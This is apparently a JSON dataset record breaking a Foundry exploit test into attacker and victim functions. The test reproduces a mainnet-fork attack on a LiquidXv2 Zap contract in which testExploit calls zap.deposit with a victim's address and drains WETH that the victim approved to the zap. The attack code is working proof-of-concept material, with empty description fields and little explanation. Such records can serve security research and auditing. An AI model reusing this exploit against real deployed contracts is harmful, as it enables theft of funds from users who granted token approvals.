[
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 19_165_893);\n        vm.deal(victim, 1 ether);\n        vm.deal(attacker, 1 ether);\n        deal(address(WETH), victim, 10 ether); // the approved funds to be stolen\n        emit log_named_uint(\"victim WETH balance (ether) before attack\", (WETH.balanceOf(victim)) / 1 ether);\n        vm.prank(victim);\n        WETH.approve(address(zap), 10 ether);\n        emit log_named_uint(\"victim approved on zap contract (ether)\", (WETH.allowance(victim, address(zap))) / 1 ether);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "Exploit",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        vm.startPrank(attacker);\n        (uint112 lqdx_before, uint112 weth_before,) = WETH_LQDX_pair.getReserves();\n        emit log_named_uint(\"before attack, LQDX in the pool\", lqdx_before / 1 ether);\n        emit log_named_uint(\"before attack, WETH in the pool\", weth_before / 1 ether);\n\n        // attack starts here\n        ILiquidXv2Zap.swapBlock[] memory path;\n        uint256[3] memory amounts = [WETH.allowance(victim, address(zap)), 0, 0];\n        zap.deposit(\n            victim,\n            address(WETH),\n            address(WETH),\n            ILiquidXv2Zap.swapPath({path: path}),\n            address(WETH),\n            address(LQDX),\n            amounts,\n            0\n        );\n\n        (uint112 lqdx_after, uint112 weth_after,) = WETH_LQDX_pair.getReserves();\n        emit log_named_uint(\"after attack, LQDX in the pool\", lqdx_after / 1 ether);\n        emit log_named_uint(\"after attack, WETH in the pool\", weth_after / 1 ether);\n        emit log_named_uint(\"victim WETH balance (ether) after attack\", (WETH.balanceOf(victim)) / 1 ether);\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "  function allowance(address owner, address spender) public view virtual override returns (uint256) {\n    return _allowances[owner][spender];\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "  function approve(address spender, uint value) external returns (bool) {\n    _approve(msg.sender, spender, value);\n    return true;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IERC20",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "  function balanceOf(address account) public view virtual override returns (uint256) {\n    return _balances[account];\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILiquidXv2Zap",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILiquidXv2Pair",
    "source_type": "victim_contract",
    "function_name": "getReserves",
    "original_code": "  function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {\n    _reserve0 = reserve0;\n    _reserve1 = reserve1;\n    _blockTimestampLast = blockTimestampLast;\n  }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ILiquidXv2Pair",
    "source_type": "victim_contract",
    "function_name": "token0",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ILiquidXv2Pair",
    "source_type": "victim_contract",
    "function_name": "token1",
    "original_code": "",
    "description": ""
  }
]